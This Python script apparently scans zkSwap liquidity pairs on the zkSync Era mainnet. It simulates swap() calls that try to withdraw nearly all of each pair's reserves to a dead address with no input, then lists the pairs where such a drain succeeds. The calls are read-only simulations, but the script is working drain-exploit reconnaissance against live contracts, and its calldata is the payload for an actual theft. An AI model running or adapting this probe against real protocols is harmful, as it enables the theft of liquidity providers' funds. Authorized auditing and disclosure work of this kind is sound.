#!/usr/bin/env python3
"""Probe each zkSwap pair: can swap() move ~the whole reserve with no input? (k-check presence)."""
import json, urllib.request, time
rows=json.load(open('/home/heisenberg/CA/zkswap-v2/analysis/zkswap_balances.json'))
RPC="https://mainnet.era.zksync.io"
SEL_SWAP="0x022c0d9f"
def enc_swap(a0,a1,to):
    return SEL_SWAP + "%064x"%a0 + "%064x"%a1 + "%064x"%int(to,16) + "%064x"%128 + "%064x"%0
def batch(calls):
    payload=[{"jsonrpc":"2.0","id":i,"method":"eth_call","params":[{"to":t,"data":d},"latest"]} for i,(t,d) in enumerate(calls)]
    for a in range(4):
        try:
            req=urllib.request.Request(RPC,data=json.dumps(payload).encode(),headers={"Content-Type":"application/json","User-Agent":"research/1.0"})
            with urllib.request.urlopen(req,timeout=90) as r: j=json.load(r)
            by={x['id']:x for x in j}
            return [by.get(i,{}) for i in range(len(calls))]
        except Exception as e:
            print('retry',a,e,flush=True); time.sleep(2)
    return [{}]*len(calls)
DEAD="0x000000000000000000000000000000000000dEaD"
out=[]
for s in range(0,len(rows),6):
    chunk=rows[s:s+6]; calls=[]
    for r in chunk:
        calls.append((r['pair'],enc_swap(max(0,r['reserve0']-1),0,DEAD)))
        calls.append((r['pair'],enc_swap(0,max(0,r['reserve1']-1),DEAD)))
    res=batch(calls)
    for i,r in enumerate(chunk):
        d0=res[2*i].get('error'); d1=res[2*i+1].get('error')
        r['drain0_ok']= d0 is None
        r['drain1_ok']= d1 is None
        r['drain0_err']= str(d0)[:160] if d0 else None
        r['drain1_err']= str(d1)[:160] if d1 else None
        out.append(r)
        print(r['idx'],r['pair'],'drain0_ok',r['drain0_ok'],'drain1_ok',r['drain1_ok'],(r['drain0_err'] or '')[:80],flush=True)
json.dump(out,open('/home/heisenberg/CA/zkswap-v2/analysis/zkswap_drainprobe.json','w'),indent=1)
print('SUCCESSFUL DRAINS:',[r['idx'] for r in out if r['drain0_ok'] or r['drain1_ok']])
